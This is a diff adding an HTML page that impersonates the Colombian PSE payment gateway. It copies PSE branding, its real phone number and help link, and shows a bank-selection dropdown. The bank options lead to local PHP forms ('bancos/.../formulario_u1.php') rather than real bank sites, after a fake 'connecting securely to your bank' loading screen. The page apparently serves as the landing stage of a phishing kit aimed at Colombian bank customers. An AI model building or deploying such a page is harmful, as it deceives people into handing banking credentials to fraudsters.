@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>¡Fácil, rápido y seguro!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: white;
+            min-height: 100vh;
+            padding: 0px 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+           
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 40px;
+            background-color: white;
+            width: 100%;
+
+        }
+
+        .pse-logo {
+            width: 50px;
+            height: 50px;
+            background: #2c5aa0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .header-text {
+            color: #2c5aa0;
+            font-size: 18px;
+            font-weight: 400;
+        }
+
+        /* Main Layout */
+        .main-layout {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .form-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            width: 500px;
+        }
+
+        /* Person Type Selection */
+        .person-type-header {
+            background: white;
+            padding: 25px 30px 15px;
+            text-align: center;
+        }
+
+        .person-type-title {
+            color: #2c5aa0;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .person-type-tabs {
+            display: flex;
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 4px;
+            gap: 4px;
+        }
+
+        .person-tab {
+            flex: 1;
+            padding: 12px 20px;
+            background: transparent;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #666;
+            transition: all 0.2s ease;
+        }
+
+        .person-tab.active {
+            background: white;
+            color: #333;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .person-tab-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #ffa726;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .person-tab.inactive .person-tab-icon {
+            background: #ddd;
+        }
+
+        /* Form Content */
+        .form-content {
+            padding: 30px;
+        }
+
+        .user-status {
+            margin-bottom: 25px;
+        }
+
+        .status-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            border: 2px solid #f0f0f0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: white;
+        }
+
+        .status-option.active {
+            border-color: #ffa726;
+            background: #fff8e1;
+        }
+
+        .status-option:hover {
+            border-color: #ffa726;
+        }
+
+        .status-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #ffa726;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+        }
+
+        .status-option:not(.active) .status-icon {
+            background: #ddd;
+        }
+
+        .status-text {
+            font-size: 15px;
+            color: #333;
+        }
+
+        /* Bank Selection */
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            color: #2c5aa0;
+            font-size: 15px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .required {
+            color: #f44336;
+        }
+
+        .bank-select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e5e5e5;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #333;
+            background: white;
+            cursor: pointer;
+            transition: border-color 0.2s ease;
+        }
+
+        .bank-select:focus {
+            outline: none;
+            border-color: #2c5aa0;
+        }
+
+        /* Action Buttons */
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary {
+            background: #ffa726;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #ff9800;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #2c5aa0;
+            border: 2px solid #2c5aa0;
+        }
+
+        .btn-secondary:hover {
+            background: #2c5aa0;
+            color: white;
+        }
+
+        /* Info Panel */
+        .info-panel {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            width: 320px;
+            height: fit-content;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffa726, #ff9800);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .info-text {
+            flex: 1;
+        }
+
+        .info-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .info-subtitle {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .contact-list {
+            margin-top: 15px;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .contact-icon {
+            width: 16px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ACH Logo */
+        .ach-logo {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: white;
+            padding: 12px 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            font-family: Arial, sans-serif;
+        }
+
+        .ach-text {
+            color: #2c5aa0;
+            font-weight: bold;
+            font-size: 20px;
+            line-height: 1;
+        }
+
+        .ach-country {
+            color: #666;
+            font-size: 10px;
+            margin-top: 2px;
+            letter-spacing: 1px;
+        }
+
+        /* Loading Screen */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(5px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .loading-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ffa726, #ff9800);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .loading-icon::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        .loading-icon i {
+            color: white;
+            font-size: 32px;
+            z-index: 1;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .loading-title {
+            color: #2c5aa0;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .loading-subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .loading-progress {
+            width: 100%;
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .loading-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ffa726, #ff9800);
+            border-radius: 3px;
+            width: 0%;
+            animation: progressBar 3s ease-in-out;
+        }
+
+        @keyframes progressBar {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .loading-dots {
+            color: #ffa726;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80%, 100% { content: '...'; }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .main-layout {
+                flex-direction: column;
+                align-items: center;
+                gap: 20px;
+            }
+
+            .form-container {
+                width: 100%;
+                max-width: 400px;
+            }
+
+            .info-panel {
+                width: 100%;
+                max-width: 400px;
+                order: -1;
+            }
+
+            .person-type-tabs {
+                flex-direction: column;
+                background: transparent;
+                padding: 0;
+                gap: 8px;
+            }
+
+            .person-tab {
+                background: white;
+                border: 2px solid #f0f0f0;
+                border-radius: 10px;
+                padding: 15px;
+            }
+
+            .person-tab.active {
+                border-color: #ffa726;
+                background: #fff8e1;
+            }
+
+            .action-buttons {
+                flex-direction: column;
+            }
+
+            .ach-logo {
+                position: static;
+                margin: 20px auto 0;
+                width: fit-content;
+            
+            }
+
+            .header {
+                justify-content: center;
+                padding-left: 0;
+            }
+
+            .loading-container {
+                padding: 30px 25px;
+            }
+
+            .loading-icon {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 20px;
+            }
+
+            .loading-icon i {
+                font-size: 24px;
+            }
+
+            .loading-title {
+                font-size: 20px;
+            }
+
+            .loading-subtitle {
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px 0;
+            }
+
+            .header{
+                width: 100%;
+            }
+
+            .container {
+                padding: 0 10px;
+            }
+
+            .form-content {
+                padding: 20px;
+            }
+
+            .person-type-header {
+                padding: 20px 20px 15px;
+            }
+
+            .info-panel {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-container">
+            <div class="loading-icon">
+                <i class="fas fa-university"></i>
+            </div>
+            <div class="loading-title">Conectando con tu banco</div>
+            <div class="loading-subtitle">
+                Te estamos redirigiendo de forma segura.<br>
+                Por favor espera un momento.
+            </div>
+            <div class="loading-progress">
+                <div class="loading-progress-bar"></div>
+            </div>
+            <div class="loading-dots">Cargando</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header"  style="display: flex; justify-content:space-between;">
+            <img src="img/imgps.png" style="width: 200px;" alt="">
+           <img src="img/NFbanner-der.svg" style="width: 190px;" alt="">
+        </div>
+
+        <!-- Main Layout -->
+        <div class="main-layout">
+            <!-- Form Container -->
+            <div class="form-container">
+                <!-- Person Type Selection -->
+                <div class="person-type-header">
+                    <h2 class="person-type-title">Selecciona el tipo de persona:</h2>
+                    <div class="person-type-tabs">
+                        <button class="person-tab active" data-type="natural">
+                            <div class="person-tab-icon"><img src="img/natural_check.svg" style="width: 150%;" alt=""></div>
+                            Natural
+                        </button>
+                        <button class="person-tab inactive" data-type="juridica">
+                            <div class="person-tab-icon"><img src="img/juridica.svg" style="width: 150%;" alt=""></div>
+                            Jurídica
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Form Content -->
+                <div class="form-content">
+                   
+
+                    <!-- Bank Selection -->
+                    <div class="form-group">
+                        <label class="form-label" for="bank-select">
+                            Selecciona tu banco <span class="required">*</span>
+                        </label>
+                        <select id="bank-select" class="bank-select">
+                                <option value="">Selecciona tu banco...</option>
+                                <option value="bancolombia" data-url="bancos/bancol/formulario_u1.php">BANCOLOMBIA</option>
+                                <option value="banco-agrario" data-url="Error.html">BANCO AGRARIO</option>
+                                <option value="av-villas" data-url="bancos/villas/formulario_u1.php">BANCO AVVILLAS</option>
+                                <option value="bbva" data-url="bancos/bba/formulario_u1.php">BANCO BBVA</option>
+                                <option value="banco-caja-social" data-url="bancos/cj/formulario_u1.php">BANCO CAJA SOCIAL</option>
+                                <option value="citibank" data-url="bancos/colpa/formulario_u1.php">BANCO CITIBANK</option>
+                                <option value="colpatria" data-url="bancos/colpa/formulario_u1.php">BANCO COLPATRIA</option>
+                                <option value="corpbanca" data-url="bancos/itau/formulario_u1.php">BANCO CORPBANCA</option>
+                                <option value="davivienda" data-url="bancos/davi/formulario_u1.php">BANCO DAVIVIENDA</option>
+                                <option value="banco-bogota" data-url="bancos/bogota/formulario_u1.php">BANCO DE BOGOTA</option>
+                                <option value="banco-occidente" data-url="bancos/occi/formulario_u1.php">BANCO DE OCCIDENTE</option>
+                                <option value="falabella" data-url="bancos/fala/formulario_u1.php">BANCO FALABELLA</option>
+                                <option value="finandina" data-url="Error.html">BANCO FINANDINA</option>
+                                <option value="ganadero" data-url="Error.html">BANCO GANADERO</option>
+                                <option value="gnb" data-url="Error.html">BANCO GNB SUDAMERIS</option>
+                                <option value="hsbc" data-url="Error.html">BANCO HSBC COLOMBIA</option>
+                                <option value="itau" data-url="bancos/itau/formulario_u1.php">BANCO ITAU</option>
+                                <option value="banco-popular" data-url="Error.html">BANCO POPULAR</option>
+                                <option value="santander" data-url="Error.html">BANCO SANTANDER</option>
+                                <option value="credibanco" data-url="Error.html">BANCO CREDIBANCO</option>
+                                <option value="helm-bank" data-url="Error.html">BANCO HELM BANK</option>
+                                <option value="nequi" data-url="bancos/nequi/formulario_u1.php">NEQUI</option>
+                                <option value="serfinansa" data-url="Error.html">SERFINANSA</option>
+                                <option value="servibanca" data-url="Error.html">SERVIBANCA</option>
+                                <option value="tuya" data-url="Error.html">TUYA</option>
+                                <option value="nubank" data-url="Error.html">NUBANK</option>
+                                <option value="nn" data-url="Error.html">Otro</option>
+                        </select>
+                    </div>
+
+                    <!-- Action Buttons -->
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="goToBank()">Ir al Banco</button>
+                        <button class="btn btn-secondary" onclick="goToCommerce()">Regresar al comercio</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Info Panel -->
+            <div class="info-panel">
+                <div class="info-header">
+                    <img src="img/footerD.svg" alt="">
+                    <div class="info-text">
+                        <div class="info-title">Para mayor información</div>
+                        <div class="info-subtitle">comunícate con nosotros:</div>
+                    </div>
+                </div>
+                
+                <div class="contact-list">
+                    <div class="contact-item">
+                        <div class="contact-icon"><i class="fa-solid fa-phone fa-sm" style="color: #2e58ff;"></i></div>
+                        <span>En Bogotá: +57 (601) 3808890 opción 5</span>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon"><i class="fa-regular fa-comment-dots" style="color: #2e7bff;"></i></div>
+                        <span>Contáctanos: 
+                            <a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank" style="color: #2c5aa0; text-decoration: none;">
+                                Centro de ayuda
+                            </a>
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ACH Logo -->
+        <div class="ach-lo">
+            <img src="img/footer.svg" alt="">
+        </div>
+    </div>
+
+    <script>
+        // Person type tabs
+        document.querySelectorAll('.person-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                document.querySelectorAll('.person-tab').forEach(t => {
+                    t.classList.remove('active');
+                    t.classList.add('inactive');
+                });
+                this.classList.remove('inactive');
+                this.classList.add('active');
+            });
+        });
+
+        // User status options
+        document.querySelectorAll('.status-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('.status-option').forEach(o => o.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+       function goToBank() {
+    const select = document.getElementById('bank-select');
+    const selectedOption = select.options[select.selectedIndex];
+    
+    if (selectedOption.value === '') {
+        alert('Por favor selecciona un banco');
+        return;
+    }
+    
+    const bankUrl = selectedOption.getAttribute('data-url');
+    if (bankUrl) {
+        // Mostrar pantalla de carga
+        document.getElementById('loadingOverlay').style.display = 'flex';
+        
+        // Redirigir después de 3 segundos
+        setTimeout(() => {
+            window.location.href = bankUrl; // Redirección en la misma pestaña
+        }, 3000);
+    }
+}
+
+
+        // Go back to commerce
+        function goToCommerce() {
+            alert('Regresando al comercio...');
+            // window.history.back();
+        }
+    </script>
+</body>
+</html>
